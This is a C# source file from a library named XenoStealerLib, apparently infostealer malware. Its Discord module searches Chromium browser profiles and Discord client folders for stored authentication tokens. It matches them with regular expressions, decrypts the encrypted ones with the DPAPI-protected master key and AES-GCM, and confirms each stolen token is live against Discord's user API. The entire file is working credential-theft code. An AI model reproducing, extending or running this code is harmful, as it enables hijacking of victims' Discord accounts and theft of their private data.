using XenoStealerLib.Utils;
using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Net;
using System.Security.Cryptography;
using System.Security.Policy;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading.Tasks;
using System.Web.Script.Serialization;
using System.Windows.Forms;

namespace XenoStealerLib
{
    public static class Discord
    {
        private static string[] profiles = {
            "Default",
            "Profile 1",
            "Profile 2",
            "Profile 3",
            "Profile 4",
            "Profile 5",
            "Profile 6",
            "Profile 7",
            "Profile 8",
            "Profile 9",
            ""
        };

        private static string appdata = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);

        private static string[] DiscordPaths =
        {
            $"{appdata}\\Discord",
            $"{appdata}\\DiscordCanary",
            $"{appdata}\\DiscordPTB",
            $"{appdata}\\DiscordDevelopment",
            $"{appdata}\\Lightcord"
        };

        public static DiscordTokenInfo[] GrabTokens(bool CheckIfTokensAreAlive=true, bool ScanBrowsers=true) 
        { 
            List<DiscordTokenInfo> UndistinctTokens= new List<DiscordTokenInfo>();
            Regex BasicRegex = new Regex(@"[\w-]{24}\.[\w-]{6}\.[\w-]{27}", RegexOptions.Compiled);
            Regex NewRegex = new Regex(@"mfa\.[\w-]{84}", RegexOptions.Compiled);
            Regex EncryptedRegex = new Regex("(dQw4w9WgXcQ:)([^.*\\['(.*)'\\].*$][^\"]*)", RegexOptions.Compiled);
            if (ScanBrowsers)
            {
                foreach (KeyValuePair<string, string> browser in Internal_Settings.ChromiumBrowsers)
                {
                    if (!Directory.Exists(browser.Value))
                    {
                        continue;
                    }
                    foreach (string profile in profiles)
                    {
                        string leveldbsPath = Path.Combine(browser.Value, profile, "Local Storage", "leveldb");
                        if (!Directory.Exists(leveldbsPath))
                        {
                            continue;
                        }
                        string[] dbfiles = Directory.GetFiles(leveldbsPath, "*.ldb", SearchOption.AllDirectories);
                        foreach (string file in dbfiles)
                        {
                            try
                            {
                                FileInfo info = new FileInfo(file);
                                string contents = File.ReadAllText(info.FullName);

                                Match match1 = BasicRegex.Match(contents);
                                while (match1.Success)
                                {
                                    UndistinctTokens.Add(new DiscordTokenInfo(match1.Value, browser.Key));
                                    match1 = match1.NextMatch();
                                }
                                Match match2 = NewRegex.Match(contents);
                                while (match2.Success)
                                {
                                    UndistinctTokens.Add(new DiscordTokenInfo(match2.Value, browser.Key));
                                    match2 = match2.NextMatch();
                                }
                            }
                            catch { }
                        }
                    }
                }
            }
            foreach (string i in DiscordPaths) 
            {
                string leveldbsPath = Path.Combine(i, "Local Storage", "leveldb");
                if (!Directory.Exists(leveldbsPath))
                {
                    continue;
                }
                string[] dbfiles = Directory.GetFiles(leveldbsPath, "*.ldb", SearchOption.AllDirectories);

                foreach (string file in dbfiles)
                {
                    try
                    {
                        FileInfo info = new FileInfo(file);
                        string contents = File.ReadAllText(info.FullName);
                        
                        Match match1 = BasicRegex.Match(contents);
                        while (match1.Success)
                        {
                            UndistinctTokens.Add(new DiscordTokenInfo(match1.Value, i));
                            match1=match1.NextMatch();
                        }
                        Match match2 = NewRegex.Match(contents);
                        while (match2.Success)
                        {
                            UndistinctTokens.Add(new DiscordTokenInfo(match2.Value, i));
                            match2=match2.NextMatch();
                        }

                        Match match3 = EncryptedRegex.Match(contents);
                        while (match3.Success)
                        {
                            string token = DecryptToken(Convert.FromBase64String(match3.Value.Split(new[] { "dQw4w9WgXcQ:" }, StringSplitOptions.None)[1]), Path.Combine(i, "Local State"));
                            UndistinctTokens.Add(new DiscordTokenInfo(token, i));
                            match3=match3.NextMatch();
                        }
                    }
                    catch { }
                }
            }
            List<DiscordTokenInfo> tokens = new List<DiscordTokenInfo>();

            using (var client = new WebClient())
            {
                foreach (DiscordTokenInfo i in UndistinctTokens)
                {
                    if (DiscordTokenInfoSlowContains(tokens, i))
                    {
                        continue;
                    }

                    if (!CheckIfTokensAreAlive) 
                    {
                        tokens.Add(i);
                        continue;
                    }

                    client.Headers.Add("authorization", i.token);
                    try
                    {
                        string userInfoData = client.DownloadString("https://discord.com/api/v9/users/@me");
                        userInfoData = TrimNewLine(userInfoData);
                        i.userInfoData = userInfoData;
                    }
                    catch 
                    {
                        client.Headers.Remove("authorization");
                        continue;
                    }
                    client.Headers.Remove("authorization");
                    tokens.Add(i);
                }
            }

            return tokens.ToArray();

        }

        private static string TrimNewLine(string input) 
        {
            if (input.Length < 4) 
            {
                return input;
            }
            if (input[0] == '\r')
            {
                if (input[1] == '\n')
                {
                    input = input.Substring(2);
                }
                else
                {
                    input = input.Substring(1);
                }
            }
            else if (input[0] == '\n') 
            {
                if (input[1] == '\r')
                {
                    input = input.Substring(2);
                }
                else
                {
                    input = input.Substring(1);
                }
            }

            if (input[input.Length - 1] == '\n') 
            {
                if (input[input.Length - 2] == '\r')
                {
                    input = input.Substring(0, input.Length - 2);
                }
                else
                {
                    input = input.Substring(0, input.Length - 1);
                }
            }
            else if (input[input.Length - 1] == '\n')
            {
                if (input[input.Length - 2] == '\r')
                {
                    input = input.Substring(0, input.Length - 2);
                }
                else
                {
                    input = input.Substring(0, input.Length - 1);
                }
            }

            if (input.StartsWith("\r") || input.StartsWith("\n") || input.EndsWith("\r") || input.EndsWith("\n")) 
            {
                return TrimNewLine(input);
            }
            return input;
        }

        private static bool DiscordTokenInfoSlowContains(List<DiscordTokenInfo> iterable, DiscordTokenInfo obj) 
        {
            foreach (DiscordTokenInfo i in iterable) 
            {
                if (i.Equals(obj)) 
                {
                    return true;
                }
            }
            return false;
        }

        private static byte[] GetMasterKey(string path)
        {
            if (!File.Exists(path))
                return null;

            string content = File.ReadAllText(path);
            if (!content.Contains("os_crypt"))
                return null;

            JavaScriptSerializer serializer = new JavaScriptSerializer();
            dynamic jsonObject = serializer.Deserialize<dynamic>(content);
            if (jsonObject != null && jsonObject.ContainsKey("os_crypt") && jsonObject["os_crypt"].ContainsKey("encrypted_key"))
            {
                string encryptedKeyBase64 = jsonObject["os_crypt"]["encrypted_key"];
                byte[] encryptedKey = Convert.FromBase64String(encryptedKeyBase64);

                byte[] masterKey = Encoding.Default.GetBytes(Encoding.Default.GetString(encryptedKey, 5, encryptedKey.Length - 5));

                return ProtectedData.Unprotect(masterKey, null, DataProtectionScope.CurrentUser);
            }
            return null;
        }

        private static string DecryptToken(byte[] buffer, string localstate_path)
        {
            byte[] masterKey = GetMasterKey(localstate_path);
            byte[] cipherText = buffer.Skip(15).ToArray();
            byte[] iv = buffer.Skip(3).Take(12).ToArray();
            byte[] tag = cipherText.Skip(cipherText.Length - 16).ToArray();
            cipherText = cipherText.Take(cipherText.Length - tag.Length).ToArray();
            byte[] DecryptedBytes = AesGcm.Decrypt(masterKey, iv, null, cipherText, tag);
            return Encoding.UTF8.GetString(DecryptedBytes).TrimEnd("\r\n\0".ToCharArray());
        }

        public class DiscordTokenInfo 
        {
            public string token;
            public string application;
            public string userInfoData;

            public DiscordTokenInfo(string token, string Application) 
            {
                this.token = token;
                this.application= Application;
            }
            public bool Equals(DiscordTokenInfo second)
            {
                return token == second.token && application == second.application;
            }
        }

    }
}
